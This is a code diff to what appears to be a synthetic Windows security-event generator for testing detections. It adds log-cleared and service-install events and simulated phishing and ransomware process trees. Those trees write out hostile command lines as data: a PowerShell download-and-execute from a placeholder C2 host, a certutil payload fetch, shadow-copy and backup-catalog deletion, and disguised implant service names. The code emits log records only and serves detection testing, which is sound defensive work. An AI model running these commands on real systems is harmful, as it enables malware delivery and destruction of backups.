@@ -159,6 +159,8 @@ _EVENT_META = {
     4725: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
     4726: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
     4738: {"task": 13824, "category": "User Account Management",   "version": 0, "outcome": "success"},
+    4697: {"task": 12805, "category": "Security System Extension",  "version": 0, "outcome": "success"},
+    1102: {"task": 104,   "category": "Log clear",                  "version": 0, "outcome": "success"},
 }
 
 def _format_message(event_id: int, ed: dict) -> str:
@@ -894,6 +896,34 @@ def _msg_4888(d):
     )
 
 
+def _msg_1102(d):
+    return (
+        "The audit log was cleared.\r\n"
+        "Subject:\r\n"
+        f"\tSecurity ID:\t{d.get('SubjectUserSid','')}\r\n"
+        f"\tAccount Name:\t{d.get('SubjectUserName','')}\r\n"
+        f"\tDomain Name:\t{d.get('SubjectDomainName','')}\r\n"
+        f"\tLogon ID:\t{d.get('SubjectLogonId','')}"
+    )
+
+
+def _msg_4697(d):
+    return (
+        "A service was installed in the system.\r\n\r\n"
+        "Subject:\r\n"
+        f"\tSecurity ID:\t\t{d.get('SubjectUserSid','')}\r\n"
+        f"\tAccount Name:\t\t{d.get('SubjectUserName','')}\r\n"
+        f"\tAccount Domain:\t\t{d.get('SubjectDomainName','')}\r\n"
+        f"\tLogon ID:\t\t{d.get('SubjectLogonId','')}\r\n\r\n"
+        "Service Information:\r\n"
+        f"\tService Name:\t\t{d.get('ServiceName','')}\r\n"
+        f"\tService File Name:\t{d.get('ServiceFileName','')}\r\n"
+        f"\tService Type:\t\t{d.get('ServiceType','')}\r\n"
+        f"\tService Start Type:\t{d.get('ServiceStartType','')}\r\n"
+        f"\tService Account:\t{d.get('ServiceAccount','')}"
+    )
+
+
 def _msg_4720(d):
     return (
         "A user account was created.\r\n\r\n"
@@ -1057,6 +1087,8 @@ _MSG_BUILDERS = {
     4887: _msg_4887,
     4888: _msg_4888,
     4720: _msg_4720,
+    4697: _msg_4697,
+    1102: _msg_1102,
     4722: _msg_4722,
     4724: _msg_4724,
     4725: _msg_4725,
@@ -1651,6 +1683,116 @@ def _build_4624(user_info, config, *, logon_type=2, auth_pkg=None,
     return _build_event(
         4624, computer, event_data, success=True, ts=ts,
     )
+
+
+_IMPLANT_SERVICE_NAMES = [
+    "WindowsUpdaterSvc", "NetSvcHost", "WinDefendHelper", "SysMonitorSvc",
+    "MsEdgeUpdateX", "TelemetrySyncSvc", "AudioSrvHost", "WdiServiceHostX",
+]
+_IMPLANT_SERVICE_FILES = [
+    "C:\\Windows\\Temp\\{n}.exe",
+    "C:\\ProgramData\\{n}\\svc.exe",
+    "C:\\Users\\Public\\{n}.exe",
+    "%COMSPEC% /c powershell.exe -nop -w hidden -enc SQBFAFgAKA...",
+    "C:\\Windows\\System32\\{n}.exe",
+]
+
+
+def _build_4697(config, *, computer, actor_user=None, actor_sid=None,
+                service_name=None, service_file=None, service_account=None,
+                start_type=None, ts=None) -> dict:
+    """4697 – A service was installed in the system (Security channel).
+
+    Emitted on the host where the service is registered by the SCM. Used to
+    model malware/implant persistence via a newly installed service. The
+    Subject is the account that installed it — SYSTEM for an SCM-brokered
+    install after the attacker already holds SeCreateServicePrivilege.
+    """
+    domain = _get_domain(config)
+    comp = _fqdn(computer, config)
+    if actor_sid is None:
+        actor_sid = _SID_SYSTEM
+        actor_user = comp.split(".")[0].upper() + "$"
+    svc_name = service_name or random.choice(_IMPLANT_SERVICE_NAMES)
+    svc_file = service_file or random.choice(_IMPLANT_SERVICE_FILES).replace("{n}", svc_name)
+    event_data = {
+        "SubjectUserSid":    actor_sid,
+        "SubjectUserName":   actor_user,
+        "SubjectDomainName": domain,
+        "SubjectLogonId":    "0x3e7",
+        "ServiceName":       svc_name,
+        "ServiceFileName":   svc_file,
+        "ServiceType":       "0x10",   # SERVICE_WIN32_OWN_PROCESS
+        "ServiceStartType":  str(start_type if start_type is not None else 2),  # 2 = Auto start (persistence)
+        "ServiceAccount":    service_account or "LocalSystem",
+    }
+    return _build_event(4697, comp, event_data, success=True, ts=ts)
+
+
+def _build_1102(user_info, config, *, ts=None) -> dict:
+    """1102 – The audit log was cleared (anti-forensics finale)."""
+    domain = _get_domain(config)
+    comp = _fqdn(user_info["hostname"], config)
+    event_data = {
+        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
+        "SubjectUserName":   user_info["username"],
+        "SubjectDomainName": domain,
+        "SubjectLogonId":    "0x%x" % random.randint(0x100000, 0x9fffff),
+    }
+    # Keep the default Security-Auditing provider so XSIAM models xdm.event.id=1102
+    # the same way it does other Security-channel events (the Eventlog provider sends it
+    # down a different modeling path where event.id doesn't resolve). Detectability > the
+    # cosmetic provider name for a test harness.
+    return _build_event(1102, comp, event_data, success=True, ts=ts)
+
+
+# A realistic phishing→execution process tree: Office spawns hidden PowerShell, which
+# drops to cmd and runs a living-off-the-land binary. Each stage's parent is the prior
+# stage, so XSIAM process analytics see a coherent tree, not isolated 4688s.
+_PROCESS_TREES = [
+    [  # Office macro → encoded PowerShell downloader → certutil payload fetch
+        ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+         "\"WINWORD.EXE\" /n \"C:\\Users\\{u}\\Downloads\\Invoice_scan.doc\"",
+         "C:\\Windows\\explorer.exe"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACA...",
+         "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
+        ("C:\\Windows\\System32\\cmd.exe",
+         "cmd.exe /c certutil -urlcache -split -f http://{c2}/beacon.exe %TEMP%\\svchost.exe",
+         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
+        ("C:\\Windows\\System32\\certutil.exe",
+         "certutil -urlcache -split -f http://{c2}/beacon.exe %TEMP%\\svchost.exe",
+         "C:\\Windows\\System32\\cmd.exe"),
+    ],
+    [  # Ransomware pre-encryption: PowerShell → vssadmin shadow delete + wbadmin
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{c2}/x')\"",
+         "C:\\Windows\\explorer.exe"),
+        ("C:\\Windows\\System32\\cmd.exe",
+         "cmd.exe /c vssadmin.exe delete shadows /all /quiet",
+         "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
+        ("C:\\Windows\\System32\\vssadmin.exe",
+         "vssadmin.exe delete shadows /all /quiet",
+         "C:\\Windows\\System32\\cmd.exe"),
+        ("C:\\Windows\\System32\\wbadmin.exe",
+         "wbadmin.exe delete catalog -quiet",
+         "C:\\Windows\\System32\\cmd.exe"),
+    ],
+]
+
+
+def _build_process_tree(user_info, config, c2_ip=None, ts=None) -> list:
+    """Return a list of linked 4688 JSON records forming a realistic execution tree."""
+    tree = random.choice(_PROCESS_TREES)
+    c2 = c2_ip or f"{random.randint(11,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+    base = ts or time.time()
+    out = []
+    for i, (proc, cmd, parent) in enumerate(tree):
+        cmd_f = cmd.replace("{u}", user_info["username"].split("\\")[-1]).replace("{c2}", c2)
+        out.append(json.dumps(_build_4688(
+            user_info, config, process_name=proc, command_line=cmd_f,
+            parent_process=parent, ts=base + i)))
+    return out
 
 
 def _build_4625(user_info, config, *, logon_type=3, auth_pkg=None,
@@ -6053,6 +6195,23 @@ def _generate_scenario_event(scenario_event, config, context):
     ev = scenario_event.upper()
     if ev in ("LOGIN", "LOGIN_SUCCESS"):
         return json.dumps(_build_4624(user, config, logon_type=2, auth_pkg=_NEG_PACKAGE)), "login_success"
+    if ev in ("NETWORK_LOGON", "WORKSTATION_LOGON"):
+        # Type-3 network logon carrying an explicit source IP — used as an IP↔user
+        # binding so IP-keyed detections (DNS/SMB) can join to resolve the user.
+        _bind_ip = (context or {}).get("src_ip") or user.get("ip")
+        return json.dumps(_build_4624(user, config, logon_type=3, ip_override=_bind_ip)), "network_logon"
+    if ev in ("SERVICE_INSTALL", "IMPLANT_SERVICE"):
+        # 4697 – a service was installed on the victim host (malware persistence).
+        _host = (context or {}).get("hostname") or user.get("hostname")
+        return json.dumps(_build_4697(config, computer=_host,
+                                      service_name=(context or {}).get("service_name"),
+                                      service_file=(context or {}).get("service_file"))), "service_install"
+    if ev in ("PROCESS_TREE", "MALWARE_EXECUTION"):
+        # A linked chain of 4688s: Office → hidden PowerShell → cmd → LOLBin.
+        return _build_process_tree(user, config, c2_ip=(context or {}).get("c2_ip")), "process_tree"
+    if ev in ("CLEAR_LOGS", "LOG_CLEARED"):
+        # 1102 – the Security audit log was cleared (anti-forensics).
+        return json.dumps(_build_1102(user, config)), "log_cleared"
     if ev in ("LOGIN_FAILURE", "LOGIN_FAILED"):
         return json.dumps(_build_4625(user, config, logon_type=2,
                                       status="0xC000006D", sub_status="0xC000006A")), "login_failure"
